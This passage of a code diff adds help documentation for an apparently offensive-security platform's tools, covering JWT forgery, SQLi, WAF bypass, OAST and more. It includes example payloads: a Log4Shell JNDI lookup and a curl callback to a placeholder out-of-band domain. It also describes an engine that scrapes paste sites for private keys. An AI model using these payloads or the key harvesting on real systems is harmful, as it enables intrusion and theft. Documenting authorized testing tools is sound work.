@@ -1823,6 +1823,553 @@ Table: metadata      → Crawl session info, start time, depth`}</CB>
     ),
   },
   {
+    id: "quantum-audit",
+    title: "QuantumAudit",
+    icon: Zap,
+    content: (
+      <div className="space-y-3">
+        <p><strong>QuantumAudit</strong> (<code>/quantum-audit/</code>) is a standalone blockchain security auditing platform. It scans smart contracts, DeFi protocols, and cryptographic implementations for both classical vulnerabilities and post-quantum cryptographic weaknesses.</p>
+        <h4 className="font-bold text-primary text-[11px]">What It Scans</h4>
+        <div className="space-y-2">
+          {[
+            { t: "Classical Vulnerabilities", d: "Reentrancy attacks (DAO-style), integer overflow/underflow, unchecked external calls, self-destruct risks, tx.origin authentication bypass, unprotected SELFDESTRUCT, front-running, flash loan vulnerabilities, access control flaws." },
+            { t: "Post-Quantum Cryptographic Risk", d: "ECDSA signature weakness detection (nonce reuse, weak-k, r-value collisions), RSA key size inadequacy for quantum era, Shor's algorithm vulnerability assessment, CRYSTALS-Kyber/Dilithium migration readiness, BLS signature strength analysis." },
+            { t: "DeFi Protocol Risks", d: "Price oracle manipulation, MEV/sandwich attack vectors, liquidity pool drain scenarios, governance token attacks, proxy upgrade vulnerabilities, slippage tolerance abuse." },
+          ].map(({ t, d }) => (
+            <div key={t} className="border border-primary/10 rounded px-3 py-2">
+              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
+              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
+            </div>
+          ))}
+        </div>
+        <h4 className="font-bold text-primary text-[11px] mt-3">How to Run a Scan</h4>
+        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
+          <li><span className="text-primary/30">1.</span> Navigate to <strong>QuantumAudit</strong> (<code>/quantum-audit/</code>).</li>
+          <li><span className="text-primary/30">2.</span> Click <strong>New Scan</strong>.</li>
+          <li><span className="text-primary/30">3.</span> Select the <strong>Chain</strong> (Ethereum, BSC, Polygon, Solana, Avalanche, or custom).</li>
+          <li><span className="text-primary/30">4.</span> Enter a <strong>contract address</strong> or paste <strong>Solidity source code</strong> directly.</li>
+          <li><span className="text-primary/30">5.</span> Select the <strong>Scan Type</strong>: Quick (core checks), Standard (full suite), or Quantum (adds post-quantum analysis).</li>
+          <li><span className="text-primary/30">6.</span> Click <strong>Start Scan</strong>. Poll status with the GET endpoint until <code>status: "completed"</code>.</li>
+          <li><span className="text-primary/30">7.</span> View results in the <strong>Scan Detail</strong> page — findings grouped by severity with remediation guidance.</li>
+          <li><span className="text-primary/30">8.</span> Click <strong>Download Report</strong> to get the full audit PDF.</li>
+        </ol>
+        <h4 className="font-bold text-primary text-[11px] mt-3">Signature Mining Engine</h4>
+        <p className="text-[10px] font-mono text-primary/83">The <strong>Sig Miner</strong> (<code>/quantum-audit/sig-miner</code>) deploys 5 independent engines that actively hunt for weak ECDSA signatures on-chain and across the web:</p>
+        <div className="space-y-1 text-[10px] font-mono text-primary/83 ml-2">
+          <div>• <strong>Engine 1 — Block Scanner</strong>: mines raw (r,s,z) tuples from on-chain transactions; detects nonce reuse and r-collisions.</div>
+          <div>• <strong>Engine 2 — Web Spider</strong>: BFS crawls paste sites and GitHub Gists for private keys and mnemonics.</div>
+          <div>• <strong>Engine 3 — OSINT Spider</strong>: GitHub code search, Pastebin, ENS text records, OP_RETURN data.</div>
+          <div>• <strong>Engine 4 — Peel Chain</strong>: follows fund-flow chains hop-by-hop, collecting signatures at each hop.</div>
+          <div>• <strong>Hybrid Worm</strong>: runs all 4 engines in parallel with shared intelligence pool and cross-deduplication.</div>
+        </div>
+        <Note type="warn">QuantumAudit is for authorized security research on contracts you own or have permission to audit. Never use signature mining on wallets you do not own or control.</Note>
+      </div>
+    ),
+  },
+  {
+    id: "jwt-analyzer-tool",
+    title: "JWT Analyzer",
+    icon: Key,
+    content: (
+      <div className="space-y-3">
+        <p><strong>JWT Analyzer</strong> (<code>/jwt-analyzer</code>) is a dedicated tool for analyzing and attacking JSON Web Tokens. It covers 5 attack categories against JWTs used in web applications.</p>
+        <h4 className="font-bold text-primary text-[11px]">Attack Categories</h4>
+        <div className="space-y-2">
+          {[
+            { t: "Analysis", d: "Decode any JWT instantly: header, payload, signature. View algorithm, expiry, issued-at, subject, role claims. Identify weak algorithms (HS256 with short secrets, alg:none)." },
+            { t: "Algorithm Confusion (RS256→HS256)", d: "Fetches the JWKS endpoint, extracts the public key, and re-signs the token using HS256 with the public key as the HMAC secret. Many libraries accept this." },
+            { t: "alg:none Attack", d: "Strips the signature and changes the algorithm header to 'none'. Tests whether the server validates the algorithm field before accepting unsigned tokens." },
+            { t: "jku / x5u Header Injection", d: "Injects a custom JWKS URL (jku header) or x5u certificate chain URL pointing to your controlled server. The server fetches your key and uses it to verify — you control the key." },
+            { t: "kid SQL / Path Injection", d: "Injects payloads into the 'kid' (key ID) field: UNION SELECT injection, OR 1=1 bypass, path traversal (../../dev/null), NULL byte, and 5 additional payloads. Includes HMAC re-signing with the injected secret." },
+            { t: "Claim Escalation", d: "Modifies JWT payload claims: role → admin, isAdmin → true, scope → admin read:all, plan → enterprise. Re-signs the modified token for submission." },
+          ].map(({ t, d }) => (
+            <div key={t} className="border border-primary/10 rounded px-3 py-2">
+              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
+              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
+            </div>
+          ))}
+        </div>
+        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
+        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
+          <li><span className="text-primary/30">1.</span> Navigate to <strong>JWT Analyzer</strong> (<code>/jwt-analyzer</code>).</li>
+          <li><span className="text-primary/30">2.</span> Paste a JWT token from your target application (intercepted via HTTP Interceptor or browser DevTools).</li>
+          <li><span className="text-primary/30">3.</span> Click <strong>Decode &amp; Analyze</strong> to see the decoded header and payload.</li>
+          <li><span className="text-primary/30">4.</span> Select an attack category from the <strong>Forgery Attacks</strong> panel.</li>
+          <li><span className="text-primary/30">5.</span> Click <strong>Generate Attack Token</strong>. The forged token is shown and auto-copied.</li>
+          <li><span className="text-primary/30">6.</span> Replay the forged token in the HTTP Interceptor or curl against the target API.</li>
+        </ol>
+        <Note type="info">All JWT attack tools are for authorized security testing only. Only test tokens from applications you own or have explicit written permission to test.</Note>
+      </div>
+    ),
+  },
+  {
+    id: "sqli-scanner-tool",
+    title: "SQL Injection Scanner",
+    icon: Database,
+    content: (
+      <div className="space-y-3">
+        <p><strong>SQL Injection Scanner</strong> (<code>/sqli-scanner</code>) is a purpose-built tool for detecting SQL injection vulnerabilities across web application endpoints. It covers error-based, blind boolean, time-based blind, and UNION-based injection types.</p>
+        <h4 className="font-bold text-primary text-[11px]">Detection Techniques</h4>
+        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
+          <div>• <strong>Error-based</strong>: Injects payloads that trigger database syntax errors — MySQL, MSSQL, Oracle, PostgreSQL error signatures detected.</div>
+          <div>• <strong>Boolean blind</strong>: Sends true and false condition payloads and compares response differences (body length, status code, response time).</div>
+          <div>• <strong>Time-based blind</strong>: Injects SLEEP(5) / WAITFOR DELAY variants and measures response time differential.</div>
+          <div>• <strong>UNION-based</strong>: Enumerates column count (ORDER BY) and injects UNION SELECT to extract data directly.</div>
+          <div>• <strong>Second-order</strong>: Stores payloads in one endpoint and triggers them in another — catches stored SQLi missed by direct scanning.</div>
+        </div>
+        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
+        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
+          <li><span className="text-primary/30">1.</span> Navigate to <strong>SQLi Scanner</strong> (<code>/sqli-scanner</code>).</li>
+          <li><span className="text-primary/30">2.</span> Enter the <strong>Target URL</strong> with the injection parameter marked (e.g., <code>https://target.com/api?id=1</code>).</li>
+          <li><span className="text-primary/30">3.</span> Select <strong>HTTP Method</strong> (GET/POST) and add any required headers (Auth, Content-Type).</li>
+          <li><span className="text-primary/30">4.</span> Choose <strong>Injection Techniques</strong> to test (all selected by default).</li>
+          <li><span className="text-primary/30">5.</span> Click <strong>Start Scan</strong>. Results show per-technique findings with evidence.</li>
+          <li><span className="text-primary/30">6.</span> For confirmed injections, click <strong>Send to SQLMap</strong> to escalate with automated exploitation.</li>
+        </ol>
+        <Note type="info">The SQLi Scanner works alongside the full SQLMap integration at <code>/sqlmap</code> — use the Scanner to detect and confirm, then SQLMap to exploit and dump databases. Always test against authorized targets only.</Note>
+      </div>
+    ),
+  },
+  {
+    id: "ssl-tls-tool",
+    title: "SSL/TLS Analyzer",
+    icon: ShieldAlert,
+    content: (
+      <div className="space-y-3">
+        <p><strong>SSL/TLS Analyzer</strong> (<code>/ssl-tls</code>) inspects TLS certificates and cipher suite configurations for security weaknesses, expired certs, weak key sizes, protocol version vulnerabilities, and HSTS/HPKP header compliance.</p>
+        <h4 className="font-bold text-primary text-[11px]">What It Checks</h4>
+        <div className="space-y-2">
+          {[
+            { t: "Certificate Details", d: "Subject, issuer, SANs, expiry date, key type and size, signature algorithm, CT log status. Alerts on certs expiring within 30 days." },
+            { t: "Protocol Versions", d: "Detects support for SSLv2, SSLv3, TLS 1.0, TLS 1.1 (all deprecated and insecure). Confirms TLS 1.2 and TLS 1.3 support." },
+            { t: "Cipher Suites", d: "Tests for NULL ciphers, export-grade ciphers (EXPORT, 40-bit), RC4, DES, 3DES (SWEET32 vulnerable), anonymous key exchange (aNULL), and MD5 MACs." },
+            { t: "Key Exchange", d: "Checks for DHE key sizes <2048 bits (Logjam), ECDHE support, and RSA key size <2048 bits." },
+            { t: "Header Compliance", d: "Verifies HSTS (Strict-Transport-Security) with max-age ≥1yr, includeSubDomains, preload. HPKP presence (deprecated but checked). Certificate pinning status." },
+            { t: "Known Vulnerabilities", d: "POODLE, BEAST, CRIME, BREACH, HEARTBLEED, DROWN, LUCKY13, ROBOT, FREAK detection based on version and configuration." },
+          ].map(({ t, d }) => (
+            <div key={t} className="border border-primary/10 rounded px-3 py-2">
+              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
+              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
+            </div>
+          ))}
+        </div>
+        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
+        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
+          <li><span className="text-primary/30">1.</span> Navigate to <strong>SSL/TLS Analyzer</strong> (<code>/ssl-tls</code>).</li>
+          <li><span className="text-primary/30">2.</span> Enter the target hostname (e.g., <code>example.com</code>) and port (default: 443).</li>
+          <li><span className="text-primary/30">3.</span> Click <strong>Analyze</strong>. The scan runs live TLS handshake probes.</li>
+          <li><span className="text-primary/30">4.</span> Review findings — Critical (expired cert, SSLv3 support) and High (weak ciphers, missing HSTS) are shown prominently.</li>
+          <li><span className="text-primary/30">5.</span> Download the full report as a formatted text file.</li>
+        </ol>
+        <Note type="warn">For results requiring SNI (Server Name Indication), the target hostname must exactly match the certificate's CN or SAN. IP addresses may show a different cert than the domain.</Note>
+      </div>
+    ),
+  },
+  {
+    id: "waf-tool",
+    title: "WAF Analyzer",
+    icon: Shield,
+    content: (
+      <div className="space-y-3">
+        <p><strong>WAF Analyzer</strong> (<code>/waf</code>) detects the presence and type of a Web Application Firewall protecting a target, then tests bypass techniques to find gaps in coverage — helping you understand what payloads your WAF misses.</p>
+        <h4 className="font-bold text-primary text-[11px]">WAF Detection</h4>
+        <p className="text-[10px] font-mono text-primary/83">The analyzer identifies 25+ WAF vendors from response headers, cookies, and behavioral signatures: Cloudflare, AWS WAF, Akamai Kona, F5 Advanced WAF, ModSecurity (OWASP CRS), Sucuri, Imperva Incapsula, Barracuda, Fortinet FortiWeb, Radware AppWall, Sophos, and more.</p>
+        <h4 className="font-bold text-primary text-[11px] mt-3">WAF Bypass Generator (<code>/waf-bypass</code>)</h4>
+        <p className="text-[10px] font-mono text-primary/83 mb-2">The companion WAF Bypass Generator creates evasion payloads for your specific WAF vendor:</p>
+        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
+          <div>• <strong>URL encoding</strong>: Single-encode, double-encode, unicode, hex, HTML entity</div>
+          <div>• <strong>SQL obfuscation</strong>: Inline comments (/**/) , version comments (/*!*/), case variation, whitespace alternatives (tab, newline, CR)</div>
+          <div>• <strong>XSS evasion</strong>: Event handler variations, tag case, SVG vectors, template literal injection, CSS expression, vbscript</div>
+          <div>• <strong>HTTP layer</strong>: Chunked Transfer Encoding, HTTP parameter pollution, path confusion (//api, /./api), Host header bypass</div>
+          <div>• <strong>Content-Type switching</strong>: text/plain, application/x-www-form-urlencoded for JSON endpoints</div>
+        </div>
+        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
+        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
+          <li><span className="text-primary/30">1.</span> Navigate to <strong>WAF Analyzer</strong> (<code>/waf</code>) and enter the target URL.</li>
+          <li><span className="text-primary/30">2.</span> Click <strong>Detect WAF</strong>. The tool identifies the vendor and version where possible.</li>
+          <li><span className="text-primary/30">3.</span> Go to <strong>WAF Bypass Generator</strong> (<code>/waf-bypass</code>).</li>
+          <li><span className="text-primary/30">4.</span> Select the detected WAF vendor and your payload type (SQLi, XSS, etc.).</li>
+          <li><span className="text-primary/30">5.</span> Copy the generated bypass payloads and test them in the HTTP Interceptor or Intruder.</li>
+        </ol>
+        <Note type="warn">Arsenal tier required for WAF Bypass Generator. WAF Analyzer is also Arsenal-tier. Authorized security testing only.</Note>
+      </div>
+    ),
+  },
+  {
+    id: "iac-scanner",
+    title: "IaC Security Scanner",
+    icon: FileText,
+    content: (
+      <div className="space-y-3">
+        <p><strong>IaC Scanner</strong> (<code>/iac-scan</code>) scans Infrastructure-as-Code files for security misconfigurations. Supports Terraform (.tf), CloudFormation (.yaml/.json), Kubernetes manifests (.yaml), Ansible playbooks, and Dockerfile.</p>
+        <h4 className="font-bold text-primary text-[11px]">What It Finds</h4>
+        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
+          <div>• <strong>Terraform</strong>: S3 buckets with public ACLs, security groups allowing 0.0.0.0/0, unencrypted RDS/EBS/S3, no MFA delete on S3, missing state encryption, overly permissive IAM policies.</div>
+          <div>• <strong>CloudFormation</strong>: Lambda execution roles with *, EC2 instances with admin IAM profiles, publicly accessible RDS, missing deletion protection.</div>
+          <div>• <strong>Kubernetes</strong>: containers running as root, hostPID/hostNetwork: true, privileged containers, missing ResourceLimits, default service account tokens, unrestricted RBAC.</div>
+          <div>• <strong>Dockerfile</strong>: running as root (no USER directive), ADD instead of COPY, hardcoded secrets (ENV PASSWORD=...), no health check, unnecessary packages in prod image.</div>
+        </div>
+        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
+        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
+          <li><span className="text-primary/30">1.</span> Navigate to <strong>IaC Scanner</strong> (<code>/iac-scan</code>).</li>
+          <li><span className="text-primary/30">2.</span> Paste your IaC file content or upload the file directly.</li>
+          <li><span className="text-primary/30">3.</span> Select the <strong>file type</strong> (auto-detected from content if left blank).</li>
+          <li><span className="text-primary/30">4.</span> Click <strong>Scan</strong>. Findings are listed by severity with the exact resource name, line reference, and fix recommendation.</li>
+          <li><span className="text-primary/30">5.</span> Click <strong>Fix &amp; Re-scan</strong> to apply suggested fixes and verify they resolve the finding.</li>
+        </ol>
+        <Note type="info">IaC Scanner is an Arsenal-tier tool. Ideal for use before deploying any cloud infrastructure — run it in your CI/CD pipeline as a gate check.</Note>
+      </div>
+    ),
+  },
+  {
+    id: "http-interceptor",
+    title: "HTTP Interceptor",
+    icon: Send,
+    content: (
+      <div className="space-y-3">
+        <p><strong>HTTP Interceptor</strong> (<code>/http-interceptor</code>) is a full web proxy that intercepts, displays, and allows editing of all HTTP/HTTPS requests and responses between your browser and the target — equivalent to Burp Suite's Proxy module.</p>
+        <h4 className="font-bold text-primary text-[11px]">Core Capabilities</h4>
+        <div className="space-y-2">
+          {[
+            { t: "Request Intercept", d: "Pause outbound requests before they are sent. Edit any part: URL, method, headers, body, cookies. Forward modified request or drop it entirely." },
+            { t: "Response Intercept", d: "Pause server responses before they reach the browser. Inject JavaScript, modify JSON responses, change status codes, strip security headers." },
+            { t: "WebSocket Traffic", d: "Intercept WebSocket frames (ws:// and wss://). Edit individual frames, replay frames, inject messages into the ws stream." },
+            { t: "Request History", d: "Full scrollable log of every intercepted request with method, status, content-type, body size, and time. Click any entry to inspect and replay." },
+            { t: "Match &amp; Replace Rules", d: "Define regex rules that automatically modify requests/responses: replace Authorization headers, inject XSS payloads into all responses, add/remove headers globally." },
+            { t: "Replay &amp; Diff", d: "Replay any historical request with modifications. Diff two responses side-by-side to identify behavioral changes from modified inputs." },
+          ].map(({ t, d }) => (
+            <div key={t} className="border border-primary/10 rounded px-3 py-2">
+              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
+              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
+            </div>
+          ))}
+        </div>
+        <h4 className="font-bold text-primary text-[11px] mt-3">Browser Proxy Setup</h4>
+        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
+          <li><span className="text-primary/30">1.</span> Open <strong>HTTP Interceptor</strong> (<code>/http-interceptor</code>) and start the proxy (shown port, default 8082).</li>
+          <li><span className="text-primary/30">2.</span> In your browser, set HTTP proxy to <code>127.0.0.1:8082</code> (Firefox: Network Settings → Manual proxy).</li>
+          <li><span className="text-primary/30">3.</span> Install the CA certificate shown on the Interceptor page to decrypt HTTPS traffic.</li>
+          <li><span className="text-primary/30">4.</span> Browse the target site — all traffic appears in the Interceptor panel.</li>
+          <li><span className="text-primary/30">5.</span> Toggle <strong>Intercept On/Off</strong> to pause or pass-through traffic.</li>
+        </ol>
+        <Note type="info">HTTP Interceptor is an Arsenal-tier tool. All VPN traffic is still routed through the ProxhqVPN tunnel while intercepting — your real IP remains protected.</Note>
+      </div>
+    ),
+  },
+  {
+    id: "api-tester",
+    title: "API Security Tester",
+    icon: Crosshair,
+    content: (
+      <div className="space-y-3">
+        <p><strong>API Security Tester</strong> (<code>/api-tester</code>) performs automated security testing against REST and GraphQL APIs — discovering endpoints, testing authentication, probing for injection, CORS misconfigurations, broken object-level authorization, and mass assignment.</p>
+        <h4 className="font-bold text-primary text-[11px]">Test Coverage (OWASP API Top 10)</h4>
+        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
+          <div>• <strong>API1 — Broken Object Level Authorization</strong>: IDOR enumeration on every object reference parameter</div>
+          <div>• <strong>API2 — Broken Authentication</strong>: JWT attacks, weak token entropy, missing auth on internal endpoints</div>
+          <div>• <strong>API3 — Excessive Data Exposure</strong>: Response field filtering validation — detects over-exposure</div>
+          <div>• <strong>API4 — Lack of Resources &amp; Rate Limiting</strong>: Sends high-rate requests and measures response degradation</div>
+          <div>• <strong>API5 — Broken Function Level Authorization</strong>: Tests admin functions with user-level tokens</div>
+          <div>• <strong>API6 — Mass Assignment</strong>: Sends extra JSON fields to detect auto-binding vulnerabilities</div>
+          <div>• <strong>API7 — Security Misconfiguration</strong>: CORS wildcard, debug mode, verbose errors, stack trace exposure</div>
+          <div>• <strong>API8 — Injection</strong>: SQLi, NoSQLi (MongoDB $where), Command Injection in API params</div>
+          <div>• <strong>API9 — Improper Assets Management</strong>: Discovers shadow APIs (/v0, /v2, /internal, /debug)</div>
+          <div>• <strong>API10 — Insufficient Logging</strong>: Verifies security event logging via canary token injection</div>
+        </div>
+        <h4 className="font-bold text-primary text-[11px] mt-3">GraphQL-Specific Tests</h4>
+        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
+          <div>• Introspection enabled detection (leaks full schema)</div>
+          <div>• Batch query amplification (denial of service vector)</div>
+          <div>• Deep query nesting (circular fragments, alias abuse)</div>
+          <div>• Field-level authorization bypass via alias injection</div>
+          <div>• Subscription endpoint security</div>
+        </div>
+        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
+        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
+          <li><span className="text-primary/30">1.</span> Navigate to <strong>API Security Tester</strong> (<code>/api-tester</code>).</li>
+          <li><span className="text-primary/30">2.</span> Enter the API base URL and optionally paste an OpenAPI/Swagger spec (auto-discovers endpoints).</li>
+          <li><span className="text-primary/30">3.</span> Add authentication: Bearer token, API key header, or cookie.</li>
+          <li><span className="text-primary/30">4.</span> Select test categories (all enabled by default).</li>
+          <li><span className="text-primary/30">5.</span> Click <strong>Run Tests</strong>. Results stream in real-time per endpoint.</li>
+        </ol>
+        <Note type="info">Arsenal-tier tool. Import your OpenAPI 3.0 or Swagger 2.0 spec for best coverage — the scanner auto-generates test cases from the spec.</Note>
+      </div>
+    ),
+  },
+  {
+    id: "oast",
+    title: "OAST — Out-of-Band Testing",
+    icon: Radio,
+    content: (
+      <div className="space-y-3">
+        <p>OAST (Out-of-Band Application Security Testing) detects vulnerabilities that have no visible response — blind SSRF, blind SQL injection, blind XXE, Log4Shell, DNS rebinding — by waiting for the target to make a callback to your controlled server.</p>
+        <h4 className="font-bold text-primary text-[11px]">OAST Callback Server (<code>/oast-server</code>)</h4>
+        <p className="text-[10px] font-mono text-primary/83 mb-2">Your dedicated OAST listener. Captures DNS lookups, HTTP requests, and SMTP callbacks from your injected payloads.</p>
+        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
+          <li><span className="text-primary/30">1.</span> Navigate to <strong>OAST Callback Server</strong> (<code>/oast-server</code>).</li>
+          <li><span className="text-primary/30">2.</span> Copy your unique OAST domain (e.g., <code>a1b2c3.oast.proxhq.net</code>).</li>
+          <li><span className="text-primary/30">3.</span> Use this domain in your payloads: <code>{"${jndi:ldap://a1b2c3.oast.proxhq.net/test}"}</code></li>
+          <li><span className="text-primary/30">4.</span> The server live-updates as callbacks arrive — showing source IP, timestamp, interaction type, and full request.</li>
+        </ol>
+        <h4 className="font-bold text-primary text-[11px] mt-3">OAST Blind Tester (<code>/oast-tester</code>)</h4>
+        <p className="text-[10px] font-mono text-primary/83 mb-2">Automates OAST payload injection across multiple vulnerability classes:</p>
+        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
+          <div>• <strong>Log4Shell</strong>: <code>{"${jndi:ldap://OAST_DOMAIN/log4shell}"}</code> injected into User-Agent, X-Forwarded-For, and 20+ other headers</div>
+          <div>• <strong>Blind SSRF</strong>: URL parameters pointing to <code>http://OAST_DOMAIN/ssrf</code></div>
+          <div>• <strong>Blind XXE</strong>: DTD with OOB exfiltration via HTTP to OAST domain</div>
+          <div>• <strong>Blind SQLi</strong>: DNS-exfiltration payloads for MySQL (load_file + UNC), MSSQL (xp_dirtree), PostgreSQL (COPY TO program), Oracle (UTL_HTTP)</div>
+          <div>• <strong>Blind Command Injection</strong>: <code>curl http://OAST_DOMAIN/ci</code>, <code>nslookup OAST_DOMAIN</code></div>
+          <div>• <strong>SMTP injection</strong>: header injection payloads that trigger mail server callbacks</div>
+        </div>
+        <Note type="info">Arsenal-tier tools. OAST is essential for finding vulnerabilities in APIs and web apps with no visible output — these issues are frequently missed by standard scanners.</Note>
+      </div>
+    ),
+  },
+  {
+    id: "dep-scanner",
+    title: "Dependency Scanner",
+    icon: ScanSearch,
+    content: (
+      <div className="space-y-3">
+        <p><strong>Dependency Scanner</strong> (<code>/dep-scanner</code>) analyzes your project's dependency files for known vulnerabilities (CVE matches), outdated packages, and software supply chain risks.</p>
+        <h4 className="font-bold text-primary text-[11px]">Supported File Types</h4>
+        <div className="grid grid-cols-2 gap-1.5">
+          {[
+            "package.json / package-lock.json (Node.js/npm)",
+            "yarn.lock (Yarn)",
+            "requirements.txt / Pipfile.lock (Python)",
+            "Gemfile.lock (Ruby)",
+            "pom.xml (Java Maven)",
+            "build.gradle (Java Gradle)",
+            "go.sum (Go modules)",
+            "composer.lock (PHP Composer)",
+            "Cargo.lock (Rust)",
+            "*.csproj / packages.config (.NET NuGet)",
+          ].map(f => <div key={f} className="text-[9px] font-mono text-primary/75 border border-primary/10 rounded px-2 py-1">{f}</div>)}
+        </div>
+        <h4 className="font-bold text-primary text-[11px] mt-3">What It Reports</h4>
+        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
+          <div>• <strong>CVE matches</strong>: Each vulnerable package is cross-referenced against the NVD database. CVE IDs, CVSS scores, and affected version ranges shown.</div>
+          <div>• <strong>Severity breakdown</strong>: Critical / High / Medium / Low counts with per-package drill-down.</div>
+          <div>• <strong>Outdated packages</strong>: Flags packages more than 2 major versions behind latest stable.</div>
+          <div>• <strong>License risks</strong>: Flags GPL/AGPL packages in commercial projects (copyleft contamination risk).</div>
+          <div>• <strong>Supply chain indicators</strong>: Packages published in last 7 days, packages with 0 downloads, typosquat candidates.</div>
+        </div>
+        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
+        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
+          <li><span className="text-primary/30">1.</span> Navigate to <strong>Dependency Scanner</strong> (<code>/dep-scanner</code>).</li>
+          <li><span className="text-primary/30">2.</span> Upload your dependency lock file or paste its contents.</li>
+          <li><span className="text-primary/30">3.</span> Click <strong>Scan Dependencies</strong>.</li>
+          <li><span className="text-primary/30">4.</span> Review findings sorted by severity. Each finding includes: CVE ID, CVSS score, affected versions, patched version, and upgrade command.</li>
+          <li><span className="text-primary/30">5.</span> Click <strong>Export Report</strong> to get a formatted vulnerability report for your client or team.</li>
+        </ol>
+        <Note type="info">Strike-tier tool. Integrate dependency scanning into your CI/CD pipeline — run before every production deployment to catch vulnerable packages before they ship.</Note>
+      </div>
+    ),
+  },
+  {
+    id: "token-seq",
+    title: "Token Sequencer",
+    icon: GitCompare,
+    content: (
+      <div className="space-y-3">
+        <p><strong>Token Sequencer</strong> (<code>/token-seq</code>) performs statistical analysis on session tokens, CSRF tokens, password reset tokens, and other cryptographic values to determine whether they are generated with sufficient randomness to resist prediction attacks.</p>
+        <h4 className="font-bold text-primary text-[11px]">Statistical Tests</h4>
+        <div className="space-y-2">
+          {[
+            { t: "Frequency Analysis", d: "Measures the distribution of individual characters/bits. Truly random tokens have uniform distribution. Non-uniform distributions indicate weak RNG." },
+            { t: "Runs Test", d: "Tests for long sequences of the same character (e.g., 'aaaa' appearing too often) — indicates sequential or low-entropy generation." },
+            { t: "Serial Test", d: "Tests correlations between adjacent characters. Predictable patterns in adjacent chars indicate PRNG with short period." },
+            { t: "Autocorrelation", d: "Measures self-correlation at various lags. High autocorrelation means the token generator has a detectable period — attackers can predict future tokens." },
+            { t: "Entropy Estimation", d: "Shannon entropy and min-entropy calculations. Compares to theoretical maximum for the token's character set." },
+            { t: "Pattern Detection", d: "Looks for timestamps, incremental IDs, and predictable structural patterns embedded in tokens (e.g., base64-encoded user IDs in the middle of a token)." },
+          ].map(({ t, d }) => (
+            <div key={t} className="border border-primary/10 rounded px-3 py-2">
+              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
+              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
+            </div>
+          ))}
+        </div>
+        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
+        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
+          <li><span className="text-primary/30">1.</span> Navigate to <strong>Token Sequencer</strong> (<code>/token-seq</code>).</li>
+          <li><span className="text-primary/30">2.</span> Collect 100–1000 tokens from the target application (session cookies, CSRF tokens, reset tokens).</li>
+          <li><span className="text-primary/30">3.</span> Paste the token list (one per line) into the Sequencer.</li>
+          <li><span className="text-primary/30">4.</span> Click <strong>Analyze</strong>. Statistical tests run and show scores and visualizations.</li>
+          <li><span className="text-primary/30">5.</span> Tokens scoring below 7.5 bits of entropy per character are flagged as potentially predictable.</li>
+        </ol>
+        <Note type="info">Arsenal-tier tool. Session token predictability is the basis for session hijacking attacks — Sequencer lets you prove or disprove token security with statistical rigor.</Note>
+      </div>
+    ),
+  },
+  {
+    id: "ws-tester",
+    title: "WebSocket Tester",
+    icon: Radio,
+    content: (
+      <div className="space-y-3">
+        <p><strong>WebSocket Tester</strong> (<code>/ws-tester</code>) provides full read/write access to WebSocket connections (ws:// and wss://), enabling interception, injection, fuzzing, and security testing of real-time communication channels.</p>
+        <h4 className="font-bold text-primary text-[11px]">Capabilities</h4>
+        <div className="space-y-1.5 text-[10px] font-mono text-primary/83">
+          <div>• <strong>Connect &amp; Inspect</strong>: Establish WebSocket connections with custom headers (Authorization, Cookie, Origin). View all incoming and outgoing messages in real-time.</div>
+          <div>• <strong>Message Injection</strong>: Send arbitrary messages (JSON, raw text, binary) at any time during an active session.</div>
+          <div>• <strong>Frame Fuzzer</strong>: Automatically fuzz WebSocket messages with XSS payloads, SQLi, command injection, format strings, and oversized payloads.</div>
+          <div>• <strong>Auth Bypass Tests</strong>: Test whether the server re-validates auth after the initial handshake — attackers who steal a token mid-session may maintain unauthorized access.</div>
+          <div>• <strong>Cross-Site WebSocket Hijacking (CSWSH)</strong>: Tests if the server validates the Origin header — missing validation allows any website to establish a ws:// connection to the target using the victim's cookies.</div>
+          <div>• <strong>Message Replay</strong>: Capture and replay specific frames from session history — useful for testing idempotency and CSRF-like attacks on WS actions.</div>
+        </div>
+        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use</h4>
+        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
+          <li><span className="text-primary/30">1.</span> Navigate to <strong>WebSocket Tester</strong> (<code>/ws-tester</code>).</li>
+          <li><span className="text-primary/30">2.</span> Enter the WebSocket URL (e.g., <code>wss://target.com/ws/chat</code>).</li>
+          <li><span className="text-primary/30">3.</span> Add headers (Cookie for authenticated sessions, custom Origin for CSWSH testing).</li>
+          <li><span className="text-primary/30">4.</span> Click <strong>Connect</strong>. The connection log shows handshake status.</li>
